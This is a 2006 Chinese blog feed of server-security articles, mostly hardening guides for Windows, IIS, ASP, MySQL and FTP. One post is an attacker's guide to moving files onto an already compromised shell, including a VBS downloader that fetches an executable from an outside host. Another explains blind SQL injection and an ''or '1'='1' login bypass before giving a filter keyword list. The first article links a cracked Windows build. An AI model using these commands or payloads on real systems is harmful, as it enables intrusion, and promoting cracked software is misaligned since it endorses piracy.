      <description>windows server2003是目前最为成熟的网络服务器平台，安全性相对于windows 2000有大大的提高,但是2003默认的安全配置不一定适合我们的需要，所以，我们要根据实际情况来对win2003进行全面安全配置。说实话，安全配置是一项比较有难度的网络技术，权限配置的太严格，好多程序又运行不起，权限配置的太松，又很容易被黑客入侵，做为网络管理员，真的很头痛，因此，我结合这几年的网络安全管理经验，总结出以下一些方法来提高我们服务器的安全性。 第一招：正确划分文件系统格式，选择稳定的操作系统安装盘 为了提高安全性，服务器的文件系统格式一定要划分成NTFS（新技术文件系统）格式，它比FAT16、FAT32的安全性、空间利用率都大大的提高，我们可以通过它来配置文件的安全性，磁盘配额、EPS文件加密等。如果你已经分成FAT32的格式了，可以用CONVERT 盘符 /FS：NTFS /V 来把FAT32转换成NTFS格式。正确安装windows 2003 server,在网安联盟http://cqhk.14023.com/Soft/yyrj/bigsoft/200504/502.asp&amp;gt;有windows 2003的企业可升级版，这个一个完全破解了的版本，可以直接网上升级,我们安装时尽量只安装我们必须要用的组件，安装完后打上最新的补丁，到网上升级到最新版本！保证操作系统本身无漏洞。 第二招：正确设置磁盘的安全性,具体如下(虚拟机的安全设置，我们以asp程序为例子)重点：
1、系统盘权限设置 C:分区部分： c:\ administrators 全部(该文件夹，子文件夹及文件) CREATOR OWNER 全部(只有子文件来及文件) system 全部(该文件夹，子文件夹及文件) IIS_WPG 创建文件/写入数据(只有该文件夹) IIS_WPG(该文件夹，子文件夹及文件) 遍历文件夹/运行文件 列出文件夹/读取数据 读取属性 创建文件夹/附加数据 读取权限 c:\Documents and Settings administrators 全部(该文件夹，子文件夹及文件) Power Users (该文件夹，子文件夹及文件) 读取和运行 列出文件夹目录 读取 SYSTEM全部(该文件夹，子文件夹及文件) C:\Program Files administrators 全部(该文件夹，子文件夹及文件) CREATOR OWNER全部(只有子文件来及文件) IIS_WPG (该文件夹，子文件夹及文件) 读取和运行 列出文件夹目录 读取 Power Users(该文件夹，子文件夹及文件) 修改权限 SYSTEM全部(该文件夹，子文件夹及文件) TERMINAL SERVER USER (该文件夹，子文件夹及文件) 修改权限 2、网站及虚拟机权限设置(比如网站在E盘) 说明：我们假设网站全部在E盘wwwsite目录下，并且为每一个虚拟机创建了一个guest用户，用户名为vhost1…vhostn并且创建了一个webuser组，把所有的vhost用户全部加入这个webuser组里面方便管理 E:\ Administrators全部(该文件夹，子文件夹及文件) E:\wwwsite Administrators全部(该文件夹，子文件夹及文件) system全部(该文件夹，子文件夹及文件) service全部(该文件夹，子文件夹及文件) E:\wwwsite\vhost1 Administrators全部(该文件夹，子文件夹及文件) system全部(该文件夹，子文件夹及文件) vhost1全部(该文件夹，子文件夹及文件) 3、数据备份盘 数据备份盘最好只指定一个特定的用户对它有完全操作的权限 比如F盘为数据备份盘，我们只指定一个管理员对它有完全操作的权限 4、其它地方的权限设置 请找到c盘的这些文件，把安全性设置只有特定的管理员有完全操作权限 下列这些文件只允许administrators访问 net.</description>
    </item>
    
    <item>
      <title>ASP安全配置不完全手册</title>
      <link>http://example.org/2006/02/25/aspe5ae89e585a8e9858de7bdaee4b88de5ae8ce585a8e6898be5868c/</link>
      <pubDate>Sat, 25 Feb 2006 16:06:27 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/aspe5ae89e585a8e9858de7bdaee4b88de5ae8ce585a8e6898be5868c/</guid>
      <description>从asp程序编写到服务器配置 ASP全称Active Server Pages，是微软推出的用来取代CGI（Common Gateway Interface）的动态服务器网页技术。由于ASP比较简单易学，又有微软这个强大后台的支持，所以应用比较广泛，相对来说发现的缺陷和针对各程序的漏洞也比较多。ASP可运行的服务器端平台包括：WinNT、Win2k、WinXP和Win2003，在Win98环境下装上PWS4.0也可以运行。现在我们就针对Win2k和Win2003这两个系统来谈谈ASP的安全配置。
ASP程序安全篇： 在做安全配置前，我们先了解一下入侵者的攻击手法。现在很流行注入攻击，所谓注入攻击，就是利用提交特殊地址将ASP中引用的正常SQL语句和入侵者所需要的SQL语句一并执行，使入侵者达到入侵的目的。现在更是有一些脚本注入工具发布，使菜鸟也可以轻松完成对ASP的注入攻击。那么我们先来了解一下这些工具是怎样注入的。 首先，入侵者会对一个网站确定可不可以进行注入，假设一篇文章的地址为： http://www.scccn.com/news.asp?id=1 一般会以提交两个地址来测试，如： http://www.scccn.com/news.asp?id=1 and 1=1 http://www.scccn.com/news.asp?id=1 and 1=2 第一个地址后面加了 and 1=1，构成的SQL语句也就变为了：Select * from 表单名 where id=1 and 1=1这句话要成立就必须and前后语句都成立。那么前面的文章地址是可以访问的，后面的1=1也是客观成立的，那么第一个地址就可以正常显示；相反1=2是显然不成立的，关键就看这步了，如果提交and 1=2页面还是正常显示说明他并没有将and 1=2写入SQL语句，此站也就不存在注入漏洞；但如果提交and 1=2之后返回了错误页面则说明此站点将后面的语句带入了SQL语句并执行了，也就说明他可以进行SQL注入。（注：如果地址后面跟的是news.asp?id=&amp;lsquo;1&amp;rsquo;就得变为news.asp?id=1&amp;rsquo; and &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1来补全引号了） 那么，知道可以注入后入侵者可以做什么呢？ 这里就简单的说一下，比如提交这样的地址： http://www.scccn.com/news.asp?id=1 and exists (select * from 表名 where 列名=数据) 根据返回的正确或错误页面来判断猜的表名和列名是否正确，具体实现时是先猜表名再猜列名。当猜出表名和列名之后还可以用ASC和MID函数来猜出各列的数据。MID函数的格式为：mid(变量名,第几个字符开始读取,读取几个字符)，比如：mid(pwd,1,2)就可以从变量pwd中的第一位开始读取两位的字符。ASC函数的格式为：ASC（&amp;ldquo;字符串&amp;rdquo;），如：asc(&amp;ldquo;a&amp;rdquo;)就可以读出字母a的ASCII码了。那么实际应用的时候就可以写为：asc(mid(pwd,1,1))这样读取的就是pwd列的第一个字符的ASCII码，提交： asc(mid(pwd,1,1))&amp;gt;97以返回的页面是否为正确页面来判断pwd列的第一个字符的ASCII码是否大于97（a的ASCII码），如果正确就再试是否小于122（z的ASCII码）……这样慢慢缩小字符的ASCII码的范围，猜到真实的ASCII码也只是时间的问题。一位一位的猜就可以得到数据库中的用户名和密码了。还有一种ASP验证缺陷——就是用户名和密码都输&amp;rsquo;or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1，构造SQL语句Select * form 表单名 where username=&amp;rsquo;&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo; and pwd=&amp;rsquo;&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;就可以达到绕过密码验证的目的。 说了那么多，其实防范的方法很简单，我们把特殊字符（如and、or、&amp;rsquo;、&amp;quot;）都禁止提交就可以防止注入了。ASP传输数据分为get和post两种， get是通过将数据添加到URL后提交的方式，post则是利用邮寄信息数据字段将数据传送到服务器。 那么，我们先来看看如何将get方式提交数据中的特殊字符过滤。首先要知道，IIS是以字符串的形式将get请求传给asp.dll的，在将数据传递给Request.QueryString之后，asp解析器会解析出Request.QueryString的信息，然后跟据&amp;quot;&amp;amp;&amp;ldquo;来分出各个数组内的数据。现在我们要让get方式不能提交以下字符： &amp;lsquo;、and、exec、insert、select、delete、update、count、*、%、chr、mid、master、truncate、char、declare 那么，防止get方式注入的代码就如下：
If Request.QueryString&amp;quot;&amp;quot; Then For Each SQL_Get In Request.QueryString For SQL_Data=0 To Ubound(sql_leach_0) if instr(Request.</description>
    </item>
    
    <item>
      <title>浅谈网络服务器安全维护技巧</title>
      <link>http://example.org/2006/02/25/e6b585e8b088e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e7bbb4e68aa4e68a80e5b7a7/</link>
      <pubDate>Sat, 25 Feb 2006 16:05:02 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e6b585e8b088e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e7bbb4e68aa4e68a80e5b7a7/</guid>
      <description>网络服务器的恶意网络行为包括两个方面：一是恶意的攻击行为，如拒绝服务攻击，网络病毒等等，这些行为旨在消耗服务器资源，影响服务器的正常运作，甚至服务器所在网络的瘫痪；另外一个就是恶意的入侵行为，这种行为更是会导致服务器敏感信息泄露，入侵者更是可以为所欲为，肆意破坏服务器。所以我们要保证网络服务器的安全可以说就是尽量减少网络服务器受这两种行为的影响。
基于windows做操作系统的服务器在中国市场的份额以及国人对该操作系统的了解程度，我在这里谈谈个人对维护windows网络服务器安全的一些个人意见。
如何避免网络服务器受网上那些恶意的攻击行为：
(一) 构建好你的硬件安全防御系统
选用一套好的安全系统模型。一套完善的安全模型应该包括以下一些必要的组件：防火墙、入侵检测系统、路由系统等。
防火墙在安全系统中扮演一个保安的角色，可以很大程度上保证来自网络的非法访问以及数据流量攻击，如拒绝服务攻击等；入侵检测系统则是扮演一个监视器的角色，监视你的服务器出入口，非常智能地过滤掉那些带有入侵和攻击性质的访问。
(二) 选用英文的操作系统
要知道，windows毕竟美国微软的东西，而微软的东西一向都是以Bug 和 Patch多而著称，中文版的Bug远远要比英文版多，而中文版的补丁向来是比英文版出的晚，也就是说，如果你的服务器上装的是中文版的windows系统，微软漏洞公布之后你还需要等上一段时间才能打好补丁，也许黑客、病毒就利用这段时间入侵了你的系统。
如何防止网络服务器不被黑客入侵：
首先，作为一个黑客崇拜者，我想说一句，世界上没有绝对安全的系统。我们只可以尽量避免被入侵，最大的程度上减少伤亡。
(一) 采用NTFS文件系统格式
大家都知道，我们通常采用的文件系统是FAT或者FAT32，NTFS是微软Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式。NTFS文件系统里你可以为任何一个磁盘分区单独设置访问权限。把你自己的敏感信息和服务信息分别放在不同的磁盘分区。这样即使黑客通过某些方法获得你的服务文件所在磁盘分区的访问权限，还需要想方设法突破系统的安全设置才能进一步访问到保存在其他磁盘上的敏感信息。
(二)做好系统备份
常言道，“有备无患”，虽然谁都不希望系统突然遭到破坏，但是不怕一万，就怕万一，作好服务器系统备份，万一遭破坏的时候也可以及时恢复。
(三)关闭不必要的服务，只开该开的端口
关闭那些不必要开的服务，做好本地管理和组管理。Windows系统有很多默认的服务其实没必要开的，甚至可以说是危险的，比如：默认的共享远程注册表访问(Remote Registry Service)，系统很多敏感的信息都是写在注册表里的，如pcanywhere的加密密码等。
关闭那些不必要的端口。一些看似不必要的端口，确可以向黑客透露许多操作系统的敏感信息，如windows 2000 server 默认开启的IIS服务就告诉对方你的操作系统是windows 2000。69端口告诉黑客你的操作系统极有可能是linux或者unix系统，因为69是这些操作系统下默认的tftp服务使用的端口。对端口的进一步访问，还可以返回该服务器上软件及其版本的一些信息，这些对黑客的入侵都提供了很大的帮助。此外，开启的端口更有可能成为黑客进入服务器的门户。
总之，做好TCP/IP端口过滤不但有助于防止黑客入侵，而且对防止病毒也有一定的帮助。
(四)软件防火墙、杀毒软件
虽然我们已经有了一套硬件的防御系统，但是“保镖”多几个也不是坏事。
(五)开启你的事件日志
虽然开启日志服务虽然说对阻止黑客的入侵并没有直接的作用，但是通过他记录黑客的行踪，我们可以分析入侵者在我们的系统上到底做过什么手脚，给我们的系统到底造成了哪些破坏及隐患，黑客到底在我们的系统上留了什么样的后门，我们的服务器到底还存在哪些安全漏洞等等。如果你是高手的话，你还可以设置密罐，等待黑客来入侵，在他入侵的时候把他逮个正着。</description>
    </item>
    
    <item>
      <title>八种文件上传大法</title>
      <link>http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/</link>
      <pubDate>Sat, 25 Feb 2006 16:03:17 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/</guid>
      <description>八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP
格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。
二：ftp下载文件
ftp下载文件一般步骤如下：
echo open xxx.xxx.xxx.xxx &amp;gt;ftp.txt
echo user &amp;raquo;ftp.txt
echo password &amp;raquo;ftp.txt
echo binary &amp;raquo;ftp.txt [可选]
echo get srv.exe &amp;raquo;ftp.txt
echo bye &amp;raquo;ftp.txt
ftp -s:ftp.txt(这一步是关键哟)
del ftp.txt
这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。
四：写程序下载
脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:
echo Set xPost = CreateObject(&amp;ldquo;Microsoft.XMLHTTP&amp;rdquo;) &amp;gt;webdown.vbs
echo xPost.Open &amp;ldquo;GET&amp;rdquo;,&amp;ldquo;http://txhak.126.com/srv.exe&amp;quot;,0 &amp;raquo;webdown.vbs
echo xPost.Send() &amp;raquo;webdown.vbs
echo Set sGet = CreateObject(&amp;ldquo;ADODB.Stream&amp;rdquo;) &amp;raquo;webdown.vbs
echo sGet.Mode = 3 &amp;raquo;webdown.vbs
echo sGet.Type = 1 &amp;raquo;webdown.vbs
echo sGet.Open() &amp;raquo;webdown.</description>
    </item>
    
    <item>
      <title>让IIS支持多种脚本</title>
      <link>http://example.org/2006/02/25/e8aea9iise694afe68c81e5a49ae7a78de8849ae69cac/</link>
      <pubDate>Sat, 25 Feb 2006 13:36:41 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e8aea9iise694afe68c81e5a49ae7a78de8849ae69cac/</guid>
      <description>在网上看了很多文章，但支持jsp的，试了Ｎ次都没成功，今天看到&amp;quot;孤独&amp;quot;的&amp;quot;jsp连接sql server 2000数据库的配置&amp;quot;，受到启发，自己小试了一会，果然成功。但俺用的操作系统是win2k-p的，都可以用，目前俺的ＩＩＳ已支持：ASP、ASP.NET、PHP、JSP、Perl，爽！！现将简单的说一下： 一、支持ASP 支持ASP的话，在IIS下直接设置一下就行的，不用另装软件。
二、支持ASP.NET 下载微软的Microsoft .NET Framework，直接安装。
三、支持PHP 下载PHP For IIS的软件，安装后，在IIS中添加&amp;quot;应用程序映射&amp;quot;中的扩展名关连。
四、支持JSP 1.先安装J2SDK(j2sdk-1_4_2-windows-i586.exe,下载地址)
2.配置J2SDK环境变量 JAVA_HOME=C:\j2sdk1.4.2 CLASSPATH=C:\j2sdk1.4.2\bin;.;C:\j2sdk1.4.2\lib;C:\j2sdk1.4.2\lib\dt.jar;C:\j2sdk1.4.2\lib\tools.jar 增加PATH=C:\j2sdk1.4.2;C:\j2sdk1.4.2\bin 配置完成后重启计算机
3.测试安装和配置是否正常 public class test{ public static void main(String args[]){ System.out.println(&amp;ldquo;This is a test program.&amp;rdquo;); } } 将以上代码保存为test.java,然后在命令提示符下输入javac test.java;java test
4.安装Tomact(jakarta-tomcat-4.1.30.exe,下载地址)
5.配置Tomact环境变量 CATALINA_HOME=C:\Program Files\Apache Group\Tomcat 4.1 增加CLASSPATH=C:\Program Files\Apache Group\Tomcat 4.1\common\lib\servlet.jar 配置完成后重启计算机
6.测试JSP是否正常 启动Tomact，然后在IE中输入http://locahost:8080/ ，如果网页能正常显示就说明ＯＫ了。
五、支持Perl 下载Perl For IIS，然后安装。
这样你的IIS就能支持Ｎ多脚本了，对于学习和测试都有很大的帮忙。上面所需的软件基本都有下载地址。本人的测试环境：Intel815EPT+CIII-1.1G+HardDisk 20G+SD 256M+Win2k-P(SP4)</description>
    </item>
    
    <item>
      <title>经验共享：服务器安全的三大纪律</title>
      <link>http://example.org/2006/02/25/e7bb8fe9aa8ce585b1e4baabefbc9ae69c8de58aa1e599a8e5ae89e585a8e79a84e4b889e5a4a7e7baaae5be8b/</link>
      <pubDate>Sat, 25 Feb 2006 13:28:09 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e7bb8fe9aa8ce585b1e4baabefbc9ae69c8de58aa1e599a8e5ae89e585a8e79a84e4b889e5a4a7e7baaae5be8b/</guid>
      <description>电子商务的兴起，使的很多中小企业都拥有了自己的服务器。对内用来建立局域网，提升办公效率;对外建立网站，更为广泛地宣传企业产品和形象，争取更多客源。但是作为网络的核心产品，服务器技术相对复杂，尤其是在病毒肆虐的网络时代，安全问题显得更加突出。笔者在公司管理服务器并检查其安全性已经有段时间了，在实际工作中积累了一些经验，希望能和大家共享。 一、增强网络整体安全
很多网管往往在维护网络安全方面存在这样的误区，认为只要将服务器单机打好补丁，安装好防护墙、操作系统定期升级就可以安枕无忧了。可实际上，很多黑客和病毒并非直接攻击服务器，而是通过入侵其他计算机作为跳板来攻击整个网络的。目前很多网络都是通过域的方式来管理，一旦黑客或病毒成功入侵与服务器有信任关系的一台计算机，那么从这台计算机攻击服务器将会变得非常简单。所以要办证整个网络的安全要从根本来考虑。
首先是安全管理，要从管理角度出发，利用规章制度等文字性的材料规范，约束各种针对计算机网络的行为，例如禁止员工随便下载非法程序，禁止网络管理员以外的人员进入中心机房，完善网络管理员的值班制度等等。
其次是安全技术，要从技术角度出发，利用各种软件和硬件，各种技巧和方法来管理整个计算机网络，杀毒软件与防火墙双管齐下力保网络的安全。
这两方面缺一不可，试想如果只有安全技术的支持而在规章制度上没有进行任何约束，即使刚开始安全做的很到位，但员工随意下载非法软件，随便关闭杀毒软件的保护的话，整个网络安全形同虚设。而只有严格的规章没有技术作为支持的话病毒和黑客也会通过网络漏洞轻松入侵。因此安全管理与安全技术两方面相辅相成，网络管理员对于这两方面都要抓，力度都要硬。
二、加强服务器本地文件格式安全级别
目前服务器都采用的是windows2000以上版本，所以在加强安全级别上需要利用windows2000server提供的用户权限功能，根据每个用户的特点单独地为其制定访问服务器的特殊使用权限，从而避免因使用统一的访问服务器权限而带来的安全隐患。
为了确保服务器的安全首先要在本地文件格式上做文章，即将FAT格式转换为安全系数更高的NTFS文件格式。毕竟对于黑客来说存储在FAT格式的磁盘分区里的数据要比存储在NTFS格式的磁盘分区的数据更容易访问，也更容易破坏，另外目前所有安全软件及加密软件也都是针对NTFS格式来说的，对FAT格式的保护非常薄弱。
另外最好使用专门的网络检测软件对整个网络的运行情况进行7*24小时的不间断监视，尤其要关注“非法入侵”和“对服务器的操作”两方面的报告，笔者做在的公司就使用IISLOCK来监视网页服务器的正常运行和MRTG来检测整个网络的流量。
三、定期备份数据
数据的保护是一个非常重要的问题，也许服务器的系统没有崩溃但里面存储的数据发生了丢失，这种情况所造成的损失会更大，特别对于数据库服务器来说也许存储的是几年的珍贵数据。怎么才能有效的保护数据?备份是唯一的选择。以往对于数据的备份都是采取在服务器上另外一个区建立备份文件夹甚至是建立一个备份区。不过这样备份方法有一个非常大的弊端，那就是一旦服务器的硬盘出现问题所有分区的数据都将丢失，从而备份没有了保证。按照“不要把所有鸡蛋放到同一个篮子”的理论我们应该使用单独的专门设备保存这些珍贵数据。
使用B服务器保存A服务器的数据，同时用A服务器保存B服务器的文件，这种交叉备份的方法在一段时间非常流行。另外还有一个有效的方法就是使用磁带来保存珍贵数据，不过这样的投资会比较大。
目前笔者所在公司所采用的备份方式是通过网络存储设备NAS来保存的，将单独的NAS设备连接到网络中，定期通过工具将珍贵数据写入到NAS的硬盘中，由于NAS设备自身使用了RAID方式进行数据的冗余，所以数据得到了最好的保证。
但是数据备份也存在巨大的安全漏洞，因为备份好的数据也有可能被盗窃，所以在备份时应该对备份介质进行有效的密码保护，必要时还需要使用加密软件对这些数据进行加密，这样即使数据被盗也不会出现数据泄露的问题。</description>
    </item>
    
    <item>
      <title>ASP木马Webshell安全解决办案</title>
      <link>http://example.org/2006/02/25/aspe69ca8e9a9acwebshelle5ae89e585a8e8a7a3e586b3e58a9ee6a188/</link>
      <pubDate>Sat, 25 Feb 2006 13:24:40 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/aspe69ca8e9a9acwebshelle5ae89e585a8e8a7a3e586b3e58a9ee6a188/</guid>
      <description>ASP木马、Webshell之安全防范解决办法正文内容：
注意：本文所讲述之设置方法与环境：适用于Microsoft Windows 2000 Server/Win2003 SERVER IIS5.0/IIS6.0 1、首先我们来看看一般ASP木马、Webshell所利用的ASP组件有那些？我们以海洋木马为列：
＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;ws&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;ws&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;net&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:093FF999-1EA0-4079-9525-9614C3504B74&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;net&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;fso&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:0D43FE01-F093-11CF-8940-00A0C9054228&amp;quot;＞ ＜/object＞ shellStr=&amp;quot;Shell&amp;quot; applicationStr=&amp;quot;Application&amp;quot; if cmdPath=&amp;quot;wscriptShell&amp;quot; set sa=server.createObject(shellStr&amp;amp;&amp;quot;.&amp;quot;&amp;amp;applicationStr;) set streamT=server.createObject(&amp;quot;adodb.stream&amp;quot;) set domainObject = GetObject(&amp;quot;WinNT://.&amp;quot;) 以上是海洋中的相关代码，从上面的代码我们不难看出一般ASP木马、Webshell主要利用了以下几类ASP组件： ① WScript.Shell (classid:72C24DD5-D70A-438B-8A42-98424B88AFB8) ② WScript.Shell.1 (classid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B) ③ WScript.Network (classid:093FF999-1EA0-4079-9525-9614C3504B74) ④ WScript.Network.1 (classid:093FF999-1EA0-4079-9525-9614C3504B74) ⑤ FileSystem Object (classid:0D43FE01-F093-11CF-8940-00A0C9054228) ⑥ Adodb.stream (classid:{00000566-0000-0010-8000-00AA006D2EA4}) ⑦ Shell.</description>
    </item>
    
    <item>
      <title>用SQL建立MySQL用户和相应权限的方法</title>
      <link>http://example.org/2006/02/25/e794a8sqle5bbbae7ab8bmysqle794a8e688b7e5928ce79bb8e5ba94e69d83e99990e79a84e696b9e6b395/</link>
      <pubDate>Sat, 25 Feb 2006 13:22:58 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/e794a8sqle5bbbae7ab8bmysqle794a8e688b7e5928ce79bb8e5ba94e69d83e99990e79a84e696b9e6b395/</guid>
      <description>好像phpMyADMIN还没有这个功能,但可以用phpMyAdmin通过输入语句的方法建立用户,或者一般的图形界面的SQL管理程序也可以建立和编辑用户. 这里只说使用GRANT语句的方法,当然还有直接修改MySQL表的方法,不过很麻烦,用的人不多~ 前提是有MySQL root权限 例子:建立另一个超级用户(所有权限)的方法 GRANT ALL ON . TO username@localhost IDENTIFIED BY &amp;lsquo;password&amp;rsquo; WITH GRANT OPTION
localhost是主机名,也可以是IP,用于限定这个用户是否可以远程连接.还可以用通配符&amp;quot;%&amp;quot;,比如%.im286.com,或者202.97.224.% WITH GRANT OPTION用于指定该用户可以使用GRANT语句将权限授予别人/没有这个选项就不可以 . 中第一个星星是数据库名(*为所有数据库),第二个星星是表名(*为前面数据库下的所有表) ALL 是指全部语句的操作权限(经常看到虚拟主机等的用户没有DROP权限,就是这里做了手脚)
语法大概就是这样吧.
例子:建立一个只能可以操作数据库im286的账号im286并可以远程连接,但不能使用GRANT. GRANT ALL ON im286.* TO im286 IDENTIFIED BY &amp;lsquo;password&amp;rsquo; (这就是一般免费空间或虚拟主机上的用户数据库权限,但没有远程连接)
例子:建立一个只能使用SELECT,INSERT,CREATE,DELETE,UPDATE语句的用户,不能远程连接 GRANT SELECT,INSERT,DELETE,UPDATE,CREATE ON dbname.* TO username@localhost IDENTIFIED BY &amp;lsquo;password&amp;rsquo;;
已建立的用户,可以用REVOKE语句收回他的权限,然后用phpMyAdmin打开mysql-&amp;gt;user,找到那个用户名,点左边第二个的删除.用户就被完全删除了.
另外上面的dbname 为数据库名 username 为用户名 password 为密码 不能用中文
如果你直接修改相关user或priv表,可以看到的权限更多,比如关闭服务器的权限,线程控制权限,reset权限等(不说了,呵呵)
运行这些语句的方法就是,在phpMyAdmin里,找一个可以贴代码的框,把代码贴进去运行就行了.当然也可以做个php小程序
原理: mysql_connect(&amp;hellip;); mysql_select_db&amp;hellip;(); mysql_query(&amp;ldquo;GRANT &amp;hellip;.&amp;rdquo;);</description>
    </item>
    
    <item>
      <title>FTP服务器架设－－安全篇</title>
      <link>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87-2/</link>
      <pubDate>Sat, 25 Feb 2006 07:57:21 +0000</pubDate>
      
      <guid>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87-2/</guid>
      <description>既然是公网ＦＴＰ服务器，就难免会遭遇一些恶意攻击，轻则丢失文件，重则造成ＦＴＰ服务器甚至整个系统崩溃。怎样才能最大限度地保证它的安全性呢？
一、操作系统的选择
ＦＴＰ服务器首先是基于操作系统而运作的，因而操作系统本身的安全性就决定了ＦＴＰ服务器安全性的级别。虽然Ｗｉｎｄｏ
ｗｓ ９８／Ｍｅ一样可以架设ＦＴＰ服务器，但由于其本身的安全性就不强，易受攻击，因而最好不要采用。Ｗｉｎｄｏｗｓ ＮＴ就像鸡肋，不用也罢。最好采用Ｗｉｎｄｏｗｓ ２０００及以上版本，并记住及时打上补丁。至于Ｕｎｉｘ、Ｌｉｎｕｘ，则不在讨论之列。
二、使用防火墙
端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口，将其他不需要使用的端口屏蔽掉会比较安全。限制端口的方法比较多，可以使用第三方的个人防火墙，如天网个人防火墙等，这里只介绍Ｗｉｎｄｏｗｓ自带的防火墙设置方法。
１．利用ＴＣＰ／ＩＰ筛选功能
在Ｗｉｎｄｏｗｓ ２０００和Ｗｉｎｄｏｗｓ ＸＰ中，系统都带有ＴＣＰ／ＩＰ筛选功能，利用它可以简单地进行端口设置。以Ｗｉｎｄｏｗｓ ＸＰ为例，打开“本地连接”的属性，在“常规”选项中找到“Ｉｎｔｅｒｎｅｔ协议（ＴＣＰ／ＩＰ）”，双击它打开该协议的属性设置窗口。点击右下方的“高级”按钮，进入“高级ＴＣＰ／ＩＰ设置”。在“选项”中选中“ＴＣＰ／ＩＰ筛选”并双击进入其属性设置。这里我们可以设置系统只允许开放的端口，假如架设的ＦＴＰ服务器端口为２１，先选中“启用ＴＣＰ／ＩＰ筛选（所有适配器）”，再在ＴＣＰ端口选项中选择“只允许”，点“添加”，输入端口号２１，确定即可。这样，系统就只允许打开２１端口。要开放其他端口，继续添加即可。这可以有效防止最常见的１３９端口入侵。缺点是功能过于简单，只能设置允许开放的端口，不能自定义要关闭的端口。如果你有大量端口要开放，就得一个个地去手工添加，比较麻烦。 ２．打开Ｉｎｔｅｒｎｅｔ连接防火墙
对于Ｗｉｎｄｏｗｓ ＸＰ系统，自带了“Ｉｎｔｅｒｎｅｔ连接防火墙”功能，与ＴＣＰ／ＩＰ筛选功能相比，设置更方便，功能更强大。除了自带防火墙端口开放规则外，还可以自行增删。在控制面板中打开“网络连接”，右击拨号连接，进入“高级”选项卡，选中“通过限制或阻止来自Ｉｎｔｅｒｎｅｔ的对此计算机的访问来保护我的计算机和网络”，启用它。系统默认状态下是关闭了ＦＴＰ端口的，因而还要设置防火墙，打开所使用的ＦＴＰ端口。点击右下角的“设置”按钮进入“高级设置”，选中“ＦＴＰ服务器”，编辑它。由于ＦＴＰ服务默认端口是２１，因而除了ＩＰ地址一栏外，其余均不可更改。在ＩＰ地址一栏中填入服务器公网ＩＰ，确定后退出即可即时生效。如果架设的ＦＴＰ服务器端口为其他端口，比如２２，则可以在“服务”选项卡下方点“添加”，输入服务器名称和公网ＩＰ后，将外部端口号和内部端口号均填入２２即可。
三、对ＩＩＳ、Ｓｅｒｖ－Ｕ等服务器软件进行设置
除了依靠系统提供的安全措施外，就需要利用ＦＴＰ服务器端软件本身的设置来提高整个服务器的安全了。
１．ＩＩＳ的安全性设置
１）及时安装新补丁
对于ＩＩＳ的安全性漏洞，可以说是“有口皆碑”了，平均每两三个月就要出一两个漏洞。所幸的是，微软会根据新发现的漏洞提供相应的补丁，这就需要你不断更新，安装最新补丁。
２）将安装目录设置到非系统盘，关闭不需要的服务
一些恶意用户可以通过ＩＩＳ的溢出漏洞获得对系统的访问权。把ＩＩＳ安放在系统分区上，会使系统文件与ＩＩＳ同样面临非法访问，容易使非法用户侵入系统分区。另外，由于ＩＩＳ是一个综合性服务组件，每开设一个服务都将会降低整个服务的安全性，因而，对不需要的服务尽量不要安装或启动。
３）只允许匿名连接
ＦＴＰ最大的安全漏洞在于其默认传输密码的过程是明文传送，很容易被人嗅探到。而ＩＩＳ又是基于Ｗｉｎｄｏｗｓ用户账户进行管理的，因而很容易泄漏系统账户名及密码，如果该账户拥有一定管理权限，则更会影响到整个系统的安全。设置为“只允许匿名连接”，可以免却传输过程中泄密的危险。进入“默认ＦＴＰ站点”，在属性的“安全账户”选项卡中，将此选项选中。
４）谨慎设置主目录及其权限
